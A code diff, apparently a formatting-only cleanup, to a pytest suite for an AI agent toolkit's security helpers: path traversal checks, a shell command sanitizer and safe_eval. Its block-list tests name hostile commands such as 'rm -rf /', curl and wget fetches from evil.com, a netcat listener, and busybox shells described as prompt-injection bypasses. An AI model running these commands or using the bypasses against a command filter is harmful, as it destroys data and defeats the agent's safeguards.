@@ -15,12 +15,11 @@ Written by VTSTech — https://www.vts-tech.org
 """
 
 import os
-import sys
+
 import pytest
 
-from agentkthx.core.helpers import validate_path, sanitize_command, is_safe_url
+from agentkthx.core.helpers import is_safe_url, sanitize_command, validate_path
 from agentkthx.core.safe_eval import safe_eval
-
 
 # ============================================================================
 # Path Traversal Tests
@@ -126,9 +125,9 @@ class TestPathTraversalEncoded:
         # (If validate_path ever started URL-decoding, the first path
         # would normalize to /etc/passwd and flip to invalid while the
         # literal control path stayed valid — this assert would catch it.)
-        assert is_valid_enc == is_valid_lit, (
-            "URL-encoded %2e%2e must not be decoded into '..' by validate_path"
-        )
+        assert (
+            is_valid_enc == is_valid_lit
+        ), "URL-encoded %2e%2e must not be decoded into '..' by validate_path"
         # POSIX determinism: both resolve under the allowed /tmp prefix.
         if os.name == "posix":
             assert is_valid_enc is True
@@ -268,23 +267,26 @@ class TestShellInjectionAndOr:
 class TestShellBlockedCommands:
     """Dangerous base commands must be blocked."""
 
-    @pytest.mark.parametrize("cmd", [
-        "rm -rf /",
-        "sudo su",
-        "curl https://evil.com",
-        "wget https://evil.com/payload",
-        "ssh user@host",
-        "nc -l 4444",
-        "nmap 192.168.1.0/24",
-        "chmod 777 /etc",
-        "kill -9 1",
-        "passwd",
-        "apt install rootkit",
-        "pip install malware",
-        # SEC-02 R06.41 additions — common prompt-injection bypass primitives
-        "busybox rm -rf /",          # busybox multi-call binary bypasses `rm` block
-        "busybox sh",                # busybox as a generic shell
-    ])
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            "rm -rf /",
+            "sudo su",
+            "curl https://evil.com",
+            "wget https://evil.com/payload",
+            "ssh user@host",
+            "nc -l 4444",
+            "nmap 192.168.1.0/24",
+            "chmod 777 /etc",
+            "kill -9 1",
+            "passwd",
+            "apt install rootkit",
+            "pip install malware",
+            # SEC-02 R06.41 additions — common prompt-injection bypass primitives
+            "busybox rm -rf /",  # busybox multi-call binary bypasses `rm` block
+            "busybox sh",  # busybox as a generic shell
+        ],
+    )
     def test_blocked_command(self, cmd):
         is_safe, error, _ = sanitize_command(cmd)
         assert not is_safe
@@ -353,7 +355,7 @@ class TestShellDangerousFlagCombos:
     # -- python / python3 -c (inline code execution) ---------------
 
     def test_python_c_blocked(self):
-        is_safe, error, _ = sanitize_command('python -c "import os; os.system(\'rm\')"')
+        is_safe, error, _ = sanitize_command("python -c \"import os; os.system('rm')\"")
         assert not is_safe
         assert "python -c" in error or "Blocked flag" in error
 
@@ -387,7 +389,7 @@ class TestShellDangerousFlagCombos:
     # -- awk system() (shell exec from inside awk script) ---------
 
     def test_awk_system_blocked(self):
-        is_safe, error, _ = sanitize_command('awk \'{system("rm")}\' /tmp/x')
+        is_safe, error, _ = sanitize_command("awk '{system(\"rm\")}' /tmp/x")
         assert not is_safe
         assert "awk system" in error or "Blocked flag" in error
 
@@ -429,17 +431,20 @@ class TestShellDangerousFlagCombos:
 class TestShellSafeCommands:
     """Benign commands should pass validation."""
 
-    @pytest.mark.parametrize("cmd", [
-        "echo hello",
-        "ls -la",
-        "pwd",
-        "date",
-        "whoami",
-        "uname -a",
-        "cat /tmp/test.txt",
-        "python3 --version",
-        "head -20 /home/user/file.txt",
-    ])
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            "echo hello",
+            "ls -la",
+            "pwd",
+            "date",
+            "whoami",
+            "uname -a",
+            "cat /tmp/test.txt",
+            "python3 --version",
+            "head -20 /home/user/file.txt",
+        ],
+    )
     def test_safe_command(self, cmd):
         is_safe, _, _ = sanitize_command(cmd)
         assert is_safe
@@ -769,6 +774,7 @@ class TestSafeEvalCorrectness:
 
     def test_zero_division_raises(self):
         import pytest
+
         with pytest.raises(ZeroDivisionError):
             safe_eval("1 / 0")
 
